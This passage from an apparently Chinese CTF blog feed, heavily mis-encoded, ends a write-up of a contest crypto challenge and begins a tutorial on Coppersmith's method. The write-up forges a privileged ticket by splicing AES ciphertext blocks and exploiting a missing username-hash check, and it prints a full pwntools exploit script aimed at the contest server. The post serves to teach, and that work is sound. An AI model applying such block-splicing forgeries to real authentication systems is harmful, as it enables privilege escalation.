äº†ï¼‰ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬è¦çš„æ˜¯cmd=Give_Me_Flagçš„å¯†æ–‡ï¼Œæ€ä¹ˆä¼ªé€ cmdå‘¢ï¼Ÿæˆ‘ä»¬ä¸èƒ½æ”¹å˜ä»»ä½•ä¸€ä¸ªå­—ç¬¦ï¼Œä¸ç„¶ç”±äºAESçš„å­˜åœ¨ï¼Œå¯†æ–‡æ•´ä¸ªå°±ä¸ä¸€æ ·äº†ã€‚ä½†æ˜¯è¾“å…¥çš„cmdåˆä¸èƒ½ç­‰äºGive_Me_Flagã€‚è¿™é‡Œæˆ‘ä»¬è¿˜æ˜¯ç”¨å‰é¢çš„æ–¹æ³•ï¼Œç”±äºè¿™é‡Œåˆ†ç»„åŠ å¯†çš„ç‰¹æ€§ï¼Œæˆ‘ä»¬æŠŠcmdé¡¶åˆ°ç¬¬äºŒå—çš„æœ«å°¾ï¼Œå¤§æ¦‚å°±æ˜¯è®©ç¬¬äºŒç»„çš„ç¬¬äºŒå—æ˜æ–‡æ˜¯è¿™æ ·å­ï¼Œ</p><p><code>&#39;Cmd=Give_Me_Flag&#39;</code></p><p>åˆšå¥½16ä¸ªå­—èŠ‚ï¼Œç„¶åæˆ‘ä»¬çš„å‘½ä»¤å°±å¯ä»¥æ”¹æˆGive_Me_Flaggï¼Œå¤šçš„gåˆ°ç¬¬äº”å—å»äº†ï¼Œå’±ä»¬å°±ä¸ç”¨ç®¡äº†ã€‚è‡³äºæ€ä¹ˆé¡¶ï¼Œè¿™é‡Œå°±è¦åˆ©ç”¨uidäº†ï¼Œåœ¨uidé•¿åº¦ä»ç„¶ä¿æŒä¸º5çš„æƒ…å†µä¸‹ï¼Œè¿›è¡ŒåŠ å‡ï¼Œæ§åˆ¶hashçš„é•¿åº¦ä¸º12å°±å¥½äº†ï¼Œ11111%16 = 7ï¼Œé‚£å°±ç”¨11116ï¼Œ</p><p><img src="https://i.loli.net/2020/12/18/rUZ1TbpSFjdhQKk.png" alt="image-20201218133935540"></p><p>å¯ä»¥çœ‹åˆ°è¿™æ ·<code>\xffT=4110a98d23fc\xff</code>åˆšå¥½å æ»¡äº†ç¬¬äºŒç»„ç¬¬ä¸€å—çš„16å­—èŠ‚ï¼Œ<code>&#39;Cmd=Give_Me_Flag</code>å äº†å¦ä¸€å—ã€‚è€Œæˆ‘ä»¬è¾“å…¥çš„cmdå‘½ä»¤æ˜¯Give_Me_Flaggï¼Œæ˜¯èƒ½è¿‡éªŒè¯çš„ã€‚è¿™æ ·äº¤äº’ï¼Œè®©ä»–åŠ å¯†ï¼Œå°±èƒ½å¾—åˆ°æ˜æ–‡ï¼š<code>b&#39;\xffT=4110a98d23fc\xff&#39;, b&#39;Cmd=Give_Me_Flag&#39;</code>ç”Ÿæˆçš„å¯†æ–‡äº†ã€‚ä½†æ˜¯è¿™é‡Œè¿˜æœ‰ä¸ªé—®é¢˜ï¼Œhashç”±ç”¨æˆ·åæ§åˆ¶ï¼Œç”¨æˆ·åä¸ºAdministratorçš„12ä½hashæ˜¯e7d3e769f3f5ï¼Œç„¶è€Œæˆ‘ä»¬åˆä¸èƒ½æ³¨å†Œç”¨æˆ·ä¸ºAdministratorï¼Œé‚£ä¸€ä¸ªæƒ³æ³•å°±æ˜¯ï¼Œç¢°æ’ï¼Œæ‰¾ä¸€ä¸ªç”±å¯è§å­—ç¬¦ä¸²ç»„æˆçš„13ä½å­—ç¬¦ä¸²ï¼ˆAdministratorçš„é•¿åº¦ï¼‰ï¼Œsha256åå‰12ä½ä¸ºe7d3e769f3f5å°±å¯ä»¥äº†ã€‚ç„¶è€Œè¿™æ˜¾ç„¶ä¸ç°å®ï¼Œ12ä½æ˜¯96bitï¼Œæœ‰è¿™ç®—åŠ›ï¼Œæ¯”ç‰¹å¸ä¸æ˜¯éšä¾¿æŒ–ï¼Ÿæ‰€ä»¥è¿™é¢˜æœ‰è§£çš„ä¸€ä¸ªåŸå› å°±æ˜¯ï¼Œè¿™ä¸ªç³»ç»Ÿå¹¶æ²¡æœ‰éªŒè¯ç”¨æˆ·åçš„hashï¼Œæ‰€ä»¥ä½ éšä¾¿æ•´ä¸ªç”¨æˆ·åå°±å¥½(æˆ‘ä»¬è¿™é‡Œå°±ç”¨çš„Administratos)ã€‚</p><p>ä½†æ˜¯æ–°é—®é¢˜äº§ç”Ÿäº†ï¼ŒAuthçš„è·å–æ€ä¹ˆåŠï¼Ÿç°åœ¨æˆ‘ä»¬çš„uid=11116ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹ç”¨æˆ·åä¸ºAdministratorï¼Œcmdä¸ºGive_Me_Flagçš„æƒ…å†µ</p><p><img src="https://i.loli.net/2020/12/17/mUTV2yFdIfXDirY.png" alt="image-20201103001239680"></p><p>æƒ³è¦å¾—åˆ°Authï¼Œå°±å¾—æ„é€ åŒæ ·çš„ç¬¬äºŒå—ã€ç¬¬å››å—æ˜æ–‡ï¼Œç¬¬äºŒå—æ˜æ–‡è¿˜å¥½è¯´ï¼Œç”¨æˆ·åæˆ‘ä»¬å¤šæ‰“ä¸€ä¸ªå­—ç¬¦å°±èƒ½ç»•è¿‡æ£€æŸ¥äº†ï¼Œè€Œè¿™ä¸ªå­—ç¬¦ä¹Ÿä¼šè¢«é¡¶åˆ°ç¬¬ä¸‰å—ï¼Œå¯¹Authæ²¡æœ‰å½±å“ï¼Œå¹¶ä¸”æˆ‘ä»¬ä¹Ÿå¯ä»¥uidç›¸åº”çš„å‡1ï¼Œè®©ç¬¬å››å—å¯†æ–‡ä¸å—åˆ°å½±å“ã€‚ä½†æ˜¯ç¬¬å››å—çš„æ˜æ–‡æœ¬èº«å°±ä¸å¥½æ“ä½œå•Šï¼Œè¿™é‡Œè¦æ˜¯ä¹Ÿå¤šæ‰“ä¸€ä¸ªå­—ç¬¦ç»•è¿‡çš„è¯ï¼Œç¬¬äº”ç»„å°±å¤šäº†ä¸€ä¸ªå­—ç¬¦ï¼Œè¿™æ ·äº§ç”Ÿçš„Authå°±å®Œå…¨å¯¹ä¸ä¸Šäº†ã€‚</p><p>æ‰€ä»¥è¦æŠŠè¯è·å–åˆ°æ­£ç¡®çš„Authï¼Œæˆ‘ä»¬éœ€è¦ç¬¬äºŒå—ï¼Œç¬¬å››å—ï¼Œç¬¬äº”å—åˆ†åˆ«ä¸ºï¼š<code>b&#39;me=Administrator&#39;, b&#39;Cmd=Give_Me_Flag&#39;, b&#39;\xff&#39;</code></p><p>è¿™é‡Œæˆ‘çš„åšæ³•æ˜¯ï¼Œç¼©çŸ­uidä¸ºä¸¤ä½é•¿ï¼Œæ„é€ ç”¨æˆ·åä¸ºï¼šme=Administratorï¼Œæ§åˆ¶uid%16ä¸º8ï¼Œæ„é€ cmdä¸ºCmd=Give_Me_Flag</p><p><img src="https://i.loli.net/2020/12/17/AZqsFpIwMEDCQlT.png" alt="image-20201103002724699"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯å®Œå…¨ä¸€è‡´çš„ã€‚å¦‚æœæ­¤æ—¶æ‰“å°å‡ºæ¥äº†C_listçš„è¯ï¼Œä¹Ÿä¼šå‘ç°ï¼Œæ­¤æ—¶è¿™ä¸¤ç»„äº§ç”Ÿçš„C_listçš„æœ€åä¸€ç»„ä¹Ÿæ˜¯ä¸€è‡´çš„ï¼Œå› ä¸ºæˆ‘ä»¬è¿™é‡ŒM_listçš„åˆ°æ•°ä¸¤ç»„æ˜¯ä¸€è‡´çš„ã€‚</p><h4 id="è§£é¢˜æµç¨‹-2"><a href="#è§£é¢˜æµç¨‹-2" class="headerlink" title="è§£é¢˜æµç¨‹"></a>è§£é¢˜æµç¨‹</h4><p>æ‰€ä»¥è¿™é“é¢˜çš„æ•´ä¸ªè§£é¢˜æµç¨‹ï¼šï¼ˆäº¤äº’å¯ä»¥ç›´æ¥æ‰‹æ’¸ï¼‰</p><ol><li>uidï¼š24ï¼Œnameï¼šme=Administratorï¼Œcmdï¼šCmd=Give_Me_Flag        è·å–Authå’Œç¬¬ä¸‰æ®µå¯†æ–‡</li><li>uidï¼š11116ï¼Œnameï¼šme=Administratorrï¼Œåé¢éšæ„                               è·å–ç¬¬ä¸€æ®µå¯†æ–‡</li><li>uidï¼š11116ï¼Œnameï¼šAdministratosï¼Œcmdï¼šGive_Me_Flagg                  è·å–ç¬¬äºŒæ®µå¯†æ–‡</li><li>å‘é€Authå’Œä¸‰æ®µå¯†æ–‡çš„æ‹¼æ¥ï¼Œè·å–flag</li></ol><p>exp</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"><span class="keyword">sh</span>=remote(<span class="string">"123.57.4.93"</span>,<span class="string">"45216"</span>)</span><br><span class="line">from pwnlib.util.iters import mbruteforce</span><br><span class="line">from hashlib import <span class="built_in">sha256</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">def proof_of_work(<span class="keyword">sh</span>):</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">"XXXX+b\'"</span>)</span><br><span class="line">    suffix = <span class="keyword">sh</span>.recvuntil(<span class="string">"\'"</span>).decode(<span class="string">"utf8"</span>)[:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">log</span>.success(suffix)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">"== b\'"</span>)</span><br><span class="line">    cipher = <span class="keyword">sh</span>.recvuntil(<span class="string">"\'"</span>).decode(<span class="string">"utf8"</span>)[:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">print</span>(suffix)</span><br><span class="line">    <span class="keyword">print</span>(cipher)</span><br><span class="line">    proof = mbruteforce(lambda <span class="keyword">x</span>: <span class="built_in">sha256</span>((<span class="keyword">x</span> + suffix).encode()).hexdigest() ==  cipher, <span class="built_in">string</span>.ascii_letters + <span class="built_in">string</span>.digits, length=<span class="number">4</span>, method=<span class="string">'fixed'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.sendlineafter(<span class="string">"Give me XXXX:"</span>, proof)</span><br><span class="line">proof_of_work(<span class="keyword">sh</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"option:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">'1'</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"id:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">'24'</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">"me=Administrator"</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"and:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">"Cmd=Give_Me_Flag"</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"?"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">""</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"ket:"</span>)</span><br><span class="line">ticket=<span class="keyword">sh</span>.recvuntil(<span class="string">"\n"</span>)[:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"Auth:"</span>)</span><br><span class="line">Auth=<span class="keyword">sh</span>.recvuntil(<span class="string">"\n"</span>)[:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"option:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"id:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">"65548"</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">"Administratorr"</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"and:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">"Give_Me_Flagg"</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"?"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">""</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"ket:"</span>)</span><br><span class="line">ticket1=<span class="keyword">sh</span>.recvuntil(<span class="string">"\n"</span>)[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"option:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">'1'</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"id:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">'65548'</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">"Administratos"</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"and:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">"Give_Me_Flagg"</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"?"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">""</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"ket:"</span>)</span><br><span class="line">ticket2=<span class="keyword">sh</span>.recvuntil(<span class="string">"\n"</span>)[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"option:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">'2'</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"Ticket:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(ticket1[:<span class="number">64</span>]+ticket2[<span class="number">64</span>:<span class="number">64</span>*<span class="number">2</span>]+ticket[-<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"Auth:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(Auth)</span><br><span class="line"></span><br><span class="line"><span class="keyword">sh</span>.interactive()</span><br></pre></td></tr></table></figure><p>ä¸å¾—ä¸è¯´è¿™ä¸€é¢˜å‡ºçš„å¾ˆç²¾å¦™ï¼Œç²¾å¦™åˆ°è¿è¾“å…¥å­—ç¬¦çš„é•¿åº¦éƒ½å¡çš„å¾ˆæ­»åˆæ°åˆ°å¥½å¤„ï¼Œuidçš„åŠŸèƒ½ä¹Ÿå¾ˆçµæ´»ï¼Œæœ€åçš„çªç ´ç‚¹åœ¨ä¸€ä¸ªhashæœªéªŒè¯ã€‚è§£é¢˜èŠ±äº†å¿«ä¸€ä¸ªæ™šä¸Šï¼Œé™¤äº†å•ƒäº†å¥½ä¹…çš„ä»£ç ï¼Œä¸»è¦æ˜¯å„ç§è¯•é”™ã€‚æƒ³äº†å¾ˆå¤šç§æ„é€ çš„æ–¹æ³•ï¼ŒåŒ…æ‹¬å­—èŠ‚ç¿»è½¬ç»•è¿‡ä¹‹ç±»çš„ï¼Œæœ€åéƒ½è¢«ä¸€ä¸€å¦å†³ã€‚</p><p>ä½†æœ€åæ„é€ å‡ºæ¥äº†å¹¶æ‹¿åˆ°flagè¿˜æ˜¯å¾ˆå¼€å¿ƒçš„ï¼Œè™½ç„¶å†ä¸€æ¬¡è®¤è¯†åˆ°äº†è‡ªå·±å’Œå¤§ä½¬ä»¬é—´çš„å·®è·ã€‚ï¼ˆé˜Ÿä¼æœ€ååªè§£å‡ºæ¥äº†ä¸¤é“å¯†ç å­¦å’Œä¸€é“é€†å‘ï¼Œå·®äº†2åä¸å†³èµ›èµ„æ ¼å¤±ä¹‹äº¤è‡‚ï¼Œè¿˜æ˜¯æŒºå¯æƒœçš„ï¼‰</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™ä¸¤åœºæ¯”èµ›çš„å››é“é¢˜ç›®çš„è´¨é‡ç®—æ˜¯æ¯”è¾ƒé«˜å­ï¼Œbyteæ˜¯ä¸¤é“å…¬é’¥å¯†ç ï¼Œä¸€ä¸ªæ˜¯CRTå’Œè„¸ï¼Œä¸€ä¸ªsm2ï¼Œã€‚x-nucaæ˜¯ä¸€ä¸ªå¥‡å¼‚çˆ±å¾·åæ›²çº¿ï¼Œå’Œä¸€ä¸ªä¸çŸ¥é“æ˜¯ä¸æ˜¯è‡ªåˆ›çš„åˆ†ç»„å¯†ç ã€‚ï¼ˆè¦æ˜¯éªŒè¯hashçš„è¯è¿™æ ·çš„ç®—æ³•ç³»ç»Ÿåº”è¯¥æ²¡åˆ«çš„æ¼æ´äº†ï¼Œå­ï¼Ÿï¼‰ç„¶åx-nucaè¿˜æœ‰ä¸€é“æˆ‘æ²¡è§£å‡ºæ¥çš„æ˜¯LWEï¼Œæ ¼å¯†ç çš„ä¸œè¥¿ï¼Œè¿˜æ˜¯æ¯”è¾ƒç”Ÿç–ã€‚</p><p>æ€»çš„æ¥è¯´è¿™ä¸¤åœºæ¯”èµ›ï¼Œä»ä¸­ç¡®å®è¿˜æ˜¯å­¦åˆ°äº†è®¸å¤šä¸œè¥¿ã€‚ä¹Ÿç¨å¾®é”»ç‚¼äº†ä¸‹å¿ƒæ€§ï¼ˆé‚£ä¹ˆé•¿çš„ä»£ç ä¸€å¼€å§‹çœŸçš„è®©äººæœ›è€Œå´æ­¥ï¼Œä½†æ˜¯ä¸€ç‚¹ç‚¹å•ƒä¸‹æ¥ï¼Œå‘ç°ä¹Ÿè¿˜å¥½å•¦ã€‚å¹¶æ²¡æœ‰æƒ³è±¡ä¸­çš„é‚£ä¹ˆå¤æ‚ï¼ˆå› ä¸ºå¤æ‚çš„åœ°æ–¹æˆ‘ç›´æ¥ä¸çœ‹ï¼Œå“ˆå“ˆå“ˆå“ˆï¼‰ï¼‰ã€‚</p><p>Stay hungry, stay foolish.</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›å°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç å­¦å­¦ä¹ ç¬”è®° ä¹‹ Coppersmithâ€™s Method</title>
      <link href="/2020/08/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bcoppersmith/"/>
      <url>/2020/08/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bcoppersmith/</url>
      
        <content type="html"><![CDATA[<p>é¦–å‘äº<a href="https://www.anquanke.com/post/id/211028" target="_blank" rel="noopener">å®‰å…¨å®¢</a></p><p>è¿™ä¸€å—å’•å’•å’•äº†å¥½ä¹…ï¼Œæš‘å‡äº†ï¼Œç»ˆäºæ‰æœ‰æ—¶é—´å»ç»†ç©¶coppersmithèƒŒåçš„åŸç†ã€‚</p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>&emsp;&emsp;è¿˜è®°å¾—è‡ªå·±åˆšå…¥é—¨CTFåæ‰“çš„ç¬¬ä¸€ä¸ªç›¸å¯¹æ¯”è¾ƒå¤§çš„æ¯”èµ›å°±æ˜¯2019å±Šçš„å¼ºç½‘æ¯ï¼Œé‚£ä¸ªæ—¶å€™å¯†ç å­¦å°±æœ‰ä¸€é“copper studyçš„é¢˜ç›®ã€‚å¯¹äºåˆšå…¥é—¨æ—¶æ¥è¯´ï¼Œè§‰å¾—é‚£é“é¢˜ç®€ç›´å°±æ˜¯ï¼ˆæ— æ³•å½¢å®¹ï¼‰ã€‚åæ¥æ‰çŸ¥é“åŸæ¥é‡Œé¢çš„æ¯ä¸€å…³éƒ½å¯ä»¥åœ¨githubä¸Šæ‰¾åˆ°ç›¸åº”çš„è„šæœ¬ã€‚ä½†æ˜¯å½“æˆ‘æƒ³å»æ‰¾åŸç†çš„æ—¶å€™ï¼Œå´å‘ç°ï¼Œï¼Œï¼Œæ‰¾ä¸åˆ°ã€‚æ‰€ä»¥ä¹Ÿæ‰æœ‰äº†è¿™ç¯‡æ–‡ç« ã€‚</p><h3 id="Coppersmithâ€™s-Method"><a href="#Coppersmithâ€™s-Method" class="headerlink" title="Coppersmithâ€™s Method"></a>Coppersmithâ€™s Method</h3><p>&emsp;&emsp;é¦–å…ˆçœ‹çœ‹Coppersmithâ€™s Methodè¿™ç©æ„å„¿èƒ½å¹²å•¥ã€‚ç®€è€Œè¨€ä¹‹ï¼Œå°±æ˜¯æœ‰ä¸€ä¸ªå‡½æ•°ï¼Œæ¯”å¦‚$F(x) = x^3+x+123$ï¼Œç„¶åæœ‰ä¸€ä¸ªæ¨¡æ•°ï¼Œæ¯”å¦‚ $M = 77$ï¼Œç„¶åå‡è®¾å­˜åœ¨ä¸€ä¸ª$x_0$ æ»¡è¶³$F(x_0) \equiv 0 \pmod{M}$, å¹¶ä¸”å¦‚æœè¿™ä¸ª$x_0$å°äºæŸä¸ªç‰¹å®šçš„å€¼ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç”¨Coppersmithâ€™s Methodå»æ‰¾åˆ°è¿™ä¸ª$x_0$ã€‚ã€PSï¼šæƒ³è¦å®ç°è¿™ä¸ªæ‰‹æ³•è¿˜æ˜¯éœ€è¦æŒæ¡ä¸€ç‚¹æ ¼åŸºè§„çº¦çš„ç›¸å…³çŸ¥è¯†çš„ï¼ˆè‡³å°‘çŸ¥é“æ ¼åŸºè§„çº¦æ˜¯å¹²å•¥çš„ï¼Œç»“æœè¾“å‡ºçš„æ˜¯å•¥ï¼‰ã€‘</p><p>&emsp;&emsp;æ€»çš„æ¥è¯´ï¼Œå¦‚æœèƒ½å°†Måˆ†è§£ï¼Œé‚£ä¹ˆæ‰¾åˆ°è¿™ä¸ª$x_0$æ˜¯å®¹æ˜“çš„ï¼Œç”¨ä¸€ä¸ªä¸­å›½å‰©ä½™å®šç†å³å¯ï¼›å¦åˆ™å°±æ˜¯å›°éš¾çš„ã€‚å¯¹åº”çš„ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ‰¾åˆ°ä¸€ä¸ªè§£æ»¡è¶³$x^2 \equiv 1 \pmod{M}$ å¹¶ä¸”è¿™ä¸ªxä¸ç­‰äº$\pm 1 \pmod{M}$ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç”¨ä¸€ä¸ªGCDå°±èƒ½å°†è¿™ä¸ªMç»™åˆ†è§£ã€‚å…·ä½“å¯å‚è€ƒ<a href="https://paper.seebug.org/727/" target="_blank" rel="noopener">äºŒåå¹´ä»¥æ¥å¯¹ RSA å¯†ç ç³»ç»Ÿæ”»å‡»ç»¼è¿°</a>ä¸€æ–‡ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¹¶ä¸å¸Œå†€äºæœ‰ä¸€ä¸ªæœ‰æ•ˆçš„ç®—æ³•å¯¹äºæ‰€æœ‰è¿™æ ·çš„åŒä½™å¼éƒ½èƒ½æ‰¾åˆ°è§£ï¼Œå¦åˆ™ä¹Ÿå°±æ„å‘³ç€å¤§æ•°åˆ†è§£é—®é¢˜ç ´è§£äº†ã€‚</p><p>&emsp;&emsp;æ—¢ç„¶ä¸èƒ½å¯¹æ‰€æœ‰çš„åŒä½™å¼éƒ½èƒ½æ‰¾åˆ°è§£ï¼Œé‚£èƒ½æ‰¾åˆ°è§£çš„æ¡ä»¶æ˜¯å•¥å‘¢ï¼Ÿå¯¹äºåº¦ä¸º$d$çš„å¤šé¡¹å¼$F(x)$ï¼Œå¦‚æœ$x_0$æ»¡è¶³$F(x_0) \equiv 0 \pmod{M}$ å¹¶ä¸”$|x_0|&lt; M^{\frac{1}{d}-\epsilon}$ï¼Œé‚£ä¹ˆè¿™ä¸ªè§£$x_0$å°±èƒ½åœ¨å¤šé¡¹å¼æ—¶é—´å†…è¢«æ‰¾åˆ°ã€‚</p><h4 id="First-Steps-to-Coppersmithâ€™s-Method"><a href="#First-Steps-to-Coppersmithâ€™s-Method" class="headerlink" title="First Steps to Coppersmithâ€™s Method"></a>First Steps to Coppersmithâ€™s Method</h4><p>&emsp;&emsp;é¦–å…ˆæˆ‘ä»¬æœ‰åœ¨æ¨¡Mä¸‹çš„åº¦ä¸ºdçš„å¹¶ä¸”ç³»æ•°ä¸ºæ•´æ•°çš„ä¸€ä¸ªé¦–ä¸€å¤šé¡¹å¼ï¼š$F(x)=x^d+a_{d-1}x^{d-1}+\dots+a_1x+a_0$ã€å¦‚æœå¤šé¡¹å¼ä¸æ˜¯é¦–ä¸€çš„ï¼Œæˆ‘ä»¬æ•´ä½“çš„ç³»æ•°ä¹˜ä¸Šä¸€ä¸ª$a_d^{-1}$å³å¯ï¼Œå¦‚æœ$a_d$åœ¨æ¨¡Mæ²¡æœ‰é€†å…ƒï¼Œé‚£è¿™æ¡åŒä½™å¼å¯ä»¥æ‹†æˆåŒä½™å¼ç»„ï¼Œä½†è¿™å¹¶ä¸æ˜¯è¿™ç¯‡æ–‡ç« è®¨è®ºçš„é‡ç‚¹ã€‘å‡è®¾æˆ‘ä»¬çŸ¥é“å­˜åœ¨ä¸€ä¸ªæ•´æ•°$x_0$æ»¡è¶³$F(x_0) \equiv 0 \pmod{M}$ å¹¶ä¸” $|x_0|&lt;M^{\frac{1}{d}}$ï¼Œæˆ‘ä»¬çš„ä»»åŠ¡å°±æ˜¯æ‰¾åˆ°è¿™æ ·çš„$x_0$ã€‚æˆ‘ä»¬æƒ³ï¼Œå¦‚æœæœ‰è¿™æ ·ä¸€æ¡å¤šé¡¹å¼$G(x)$ï¼Œä»–çš„è§£ä¹Ÿæ˜¯$x_0$ã€‚ä½†æ˜¯ä»–çš„ç³»æ•°å¾ˆå°ï¼Œå¯¼è‡´$x_0$å¯ä»¥æ»¡è¶³$G(x_0)= 0$ã€æ³¨æ„è¿™é‡Œæ˜¯ç­‰å·ï¼Œä¸æ˜¯åŒäºå·ã€‘Coppersmithâ€™s Methodå°±æ˜¯æƒ³åŠæ³•å»å°†è¿™ä¸ª$F(x)$å˜å½¢ä¸ºæˆä¸ºè¿™æ ·çš„$G(x)$ã€‚</p><h5 id="example-1"><a href="#example-1" class="headerlink" title="example 1"></a>example 1</h5><p>&emsp;&emsp;å‡è®¾$M=17 * 19=323$ï¼Œ$F(x)=x^2+33x+215$,æˆ‘ä»¬æƒ³æ‰¾åˆ°ä¸€ä¸ªå°æ ¹$x_0$æ»¡è¶³$F(x_0)\equiv 0 \pmod{M}$ã€è¿™é‡Œçš„$x_0=3$ï¼Œä½†æ˜¯åœ¨æ•´æ•°åŸŸä¸‹ï¼Œ$F(3)!=0$ ã€‘</p><p>&emsp;&emsp;æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå¤šé¡¹å¼$G(x) = 9\cdot F(x) -M\cdot(x+6)=9x^2-26x-3$ æ»¡è¶³$G(3)=0$ï¼Œè¿™ä¸ªè§£å¯ä»¥ç›´æ¥ç”¨æ±‚æ ¹å…¬å¼å¾—åˆ°ï¼Œå¦‚æœæ¬¡æ•°æ¯”è¾ƒå¤§ï¼Œä¹Ÿå¯ä»¥ç”¨ç‰›é¡¿è¿­ä»£æ³•ã€‚</p><p>&emsp;&emsp;å¥½äº†ï¼Œè¿™å°±æ˜¯ä¸€å…ƒCoppersmithâ€™s Methodæ 